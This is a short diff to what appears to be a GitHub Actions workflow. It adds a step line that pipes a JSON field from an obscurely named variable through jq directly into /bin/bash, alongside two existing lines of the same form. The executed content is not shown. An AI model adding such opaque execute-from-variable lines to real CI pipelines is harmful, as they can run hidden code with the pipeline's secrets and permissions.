@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$n23" | jq -r .xsv7269 | /bin/bash
           printf '%s' "$rock26" | jq -r .cacws4212 | /bin/bash
+          echo $tfu7 | jq -r .sbw046 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
